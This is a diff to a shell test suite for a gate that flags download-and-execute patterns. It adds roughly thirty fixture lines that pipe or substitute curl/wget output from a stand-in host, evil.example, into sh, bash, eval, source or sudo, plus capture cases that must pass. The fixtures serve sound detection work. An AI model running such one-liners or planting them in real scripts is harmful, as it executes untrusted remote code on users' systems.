@@ -54,6 +54,58 @@ r="$work/wget"; mkdir -p "$r/bin"
 printf 'wget -qO- https://x.example/i | bash\n' > "$r/bin/tool"
 [ "$(run "$r")" != "0" ] && ok || fail "a wget|bash fetch must fail the gate"
 
+# --- a fetch EXECUTED through command or process substitution is caught -------
+# No pipe after curl/wget, so the pipe arm alone passed every one of these
+# (measured). One fixture file per shape, each in its own tree.
+i=0
+while IFS= read -r line; do
+  i=$((i + 1)); r="$work/subst$i"; mkdir -p "$r/lib"
+  printf 'noop() { : ; }\n' > "$r/lib/os.sh"
+  printf '%s\n' "$line" > "$r/lib/boot.sh"
+  [ "$(run "$r")" != "0" ] && ok || fail "an executed fetch must fail the gate: $line"
+done <<'SHAPES'
+sh -c "$(curl -fsSL https://evil.example/i.sh)"
+bash -c "$(wget -qO- https://evil.example/i.sh)"
+eval "$(curl -fsSL https://evil.example/i.sh)"
+eval `curl -fsSL https://evil.example/i.sh`
+source <(curl -fsSL https://evil.example/i.sh)
+. <(curl -fsSL https://evil.example/i.sh)
+bash <(wget -qO- https://evil.example/i.sh)
+bash -lc "$(curl -fsSL https://evil.example/i.sh)"
+zsh -ec "$(wget -qO- https://evil.example/i.sh)"
+sh -c "$(command curl -fsSL https://evil.example/i.sh)"
+bash -c "$(\curl -fsSL https://evil.example/i.sh)"
+bash < <(curl -fsSL https://evil.example/i.sh)
+\curl -fsSL https://evil.example/i.sh | sh
+curl -fsSL https://evil.example/i.sh | sudo bash
+curl -fsSL https://evil.example/i.sh | /bin/bash
+wget -qO- https://evil.example/i.sh | env bash
+bash -l -c "$(curl -fsSL https://evil.example/i.sh)"
+bash --norc -c "$(curl -fsSL https://evil.example/i.sh)"
+bash -c -- "$(curl -fsSL https://evil.example/i.sh)"
+sh -c "  $(curl -fsSL https://evil.example/i.sh)"
+eval "$(env curl -fsSL https://evil.example/i.sh)"
+bash -c "$(/usr/bin/curl -fsSL https://evil.example/i.sh)"
+curl -fsSL https://evil.example/i.sh | sudo -E bash
+curl -fsSL https://evil.example/i.sh | sudo -u root bash
+curl -fsSL https://evil.example/i.sh |& bash
+curl -fsSL https://evil.example/i.sh | exec bash
+curl -fsSL https://evil.example/i.sh | "bash"
+curl -fsSL https://evil.example/i.sh | ksh
+wget -qO- https://evil.example/i.sh | dash
+bash <(sudo curl -fsSL https://evil.example/i.sh)
+eval -- "$(curl -fsSL https://evil.example/i.sh)"
+SHAPES
+
+# --- capturing a download is NOT executing it (passes) -------------------------
+r="$work/capture"; mkdir -p "$r/lib"
+printf 'noop() { : ; }\n' > "$r/lib/os.sh"
+printf '%s\n' 'body="$(curl -fsSL https://api.example/v1)"' 'medieval="$(wget -qO- https://x.example)"' \
+  'bash -x "$(command -v curl)"' 'sh -e ./build.sh < "$(curl_cfg)"' \
+  'curl -fsSL https://x.example/f | shasum -a 256' 'wget -qO- https://x.example | bashful' \
+  'curl -fsSL https://x.example/f | tee out.log' 'curl -fsSL https://x.example/f | grep bash' > "$r/lib/fetch.sh"
+[ "$(run "$r")" = "0" ] && ok || fail "capturing curl/wget output into a variable must pass"
+
 # --- ad-hoc `uname -m` OUTSIDE lib/os.sh is caught ---------------------------
 r="$work/uname"; mkdir -p "$r/lib" "$r/zsh"
 printf 'noop() { : ; }\n' > "$r/lib/os.sh"
